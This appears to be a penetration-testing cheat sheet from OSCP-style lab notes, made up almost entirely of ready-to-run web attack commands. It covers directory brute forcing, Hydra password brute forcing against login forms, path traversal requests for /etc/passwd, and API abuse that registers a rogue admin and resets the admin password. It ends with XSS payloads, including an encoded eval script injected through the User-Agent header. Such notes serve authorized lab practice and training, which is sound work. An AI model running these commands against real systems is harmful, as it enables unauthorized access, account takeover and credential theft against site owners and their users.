## Technology Stack Identification

- Wappalyzer
- whatweb


## Directory Brute Force with Gobuster

```sh
# -x txt,ini,conf,bak,pdf,php,asp,aspx,jsp,do,env,settings,xml,ini
gobuster dir -u $URL -w $WORDLIST
gobuster dir -u $URL -w $WORDLIST -x pdf,txt,ini
gobuster dir -u $URL -w $WORDLIST -t 5 -U offsec -P elite
gobuster dir -u $URL/api/ -w $WORDLIST
feroxbuster -u $URL -w $WORDLIST -t 5
wfuzz -c -z file,$WORDLIST --hc 404 $RHOST:8080/FUZZ
wfuzz -c -z file,$WORDLIST --hc 404 $RHOST:8080/FUZZ/
wfuzz -c -z file,$WORDLIST --hc 404,308 $RHOST:8080/FUZZ/


```

## Security Testing with Burp Suite

- Intruder, 
- Repeater, 
- Compare,
- Encode / Decode

## Hydra

Hydra burce force http-post-form

```sh

hydra -U http-post-form
hydra -l admin -P passwords.txt  $RHOST http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed" -t 1 -V


## Inspecting HTTP Response Headers and Sitemaps

```sh

curl -I $URL
curl -i $URL
curl -c cookie --data "password=P@ssw0rd1" "http://$RHOST:8080/login/"
curl -i -b cookie "http://$RHOST:8080/data/L2V0Yy9wYXNzd2Q="
curl -i --get --data "email=oscp@oscp.com" $RHOST:50000/generate -vv --proxy 127.0.0.1:8080
curl -i -X 'POST' --data-urlencode "code=6+3" $RHOST:50000/verify -vv
curl -H "X-Forwarded-For: 127.0.0.1" -H "Content-Type: application/json" "$RHOST:13337/logs?file=/etc/passwd" --proxy 127.0.0.1:8080
curl -s -i -X POST -H 'Content-Length: 0' http://$RHOST/list-running-procs

# Check for something strange like :
X-Error, X-Something-Non-Standard, X-Forwarded-For, X-Powered-By,x-amz-cf-id, X-Aspnet-Version

```

## Files

```sh
sitemap.xml
robots.txt
```

## Enumerating and Abusing APIs


```sh

cat pattern 
{GOBUSTER}/v1
{GOBUSTER}/v2

gobuster dir -u http://$RHOST -w $WORDLIST -p pattern

curl -i http://$RHOST/users/v1
gobuster dir -u http://$RHOST/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

# test to login
curl -i http://$RHOST/users/v1/admin/password
curl -i http://$RHOST/users/v1/login
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://$RHOST/users/v1/login

# attempt to registre a new admin user
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://$RHOST/users/v1/register
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://$RHOST/users/v1/register

# login as the new admin user 
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://$RHOST/users/v1/login

# try to change admin's password
curl 'http://$RHOST/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXA...kew' \
  -d '{"password": "pwned"}'

curl -X 'PUT' 'http://$RHOST/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXA...UAsgA4' \
  -d '{"password": "pwned"}'

# login as admin user and the new password
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://$RHOST/users/v1/login

# test with BurpSuite
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://$RHOST/users/v1/login --proxy 127.0.0.1:8080

```

## Cross-Site Scripting


```sh
# Identifying XSS Vulnerabilities
# The most common special characters
# < > ' " { } ;

# Basic XSS

<script>alert(1)</script>
<script>console.log(1)</script>

Privilege Escalation via XSS

GET / HTTP/1.1
Host: 100.100.100.100
User-Agent: Abonti <\/pre>#PUT YOUR JAVASCRIPT HERE#
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://100.100.100.100/<\/pre>#PUT YOUR JAVASCRIPT HERE#
Connection: close
Cache-Control: max-age=0

## JS Encoding JS Function

```javascript
function encode_to_javascript(string) {
      var input = string
      var output = '';
      for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
          output += ",";
        }
      }
      return output;
    }
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
```sh
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,...,59))</script>" --proxy 127.0.0.1:8080

```



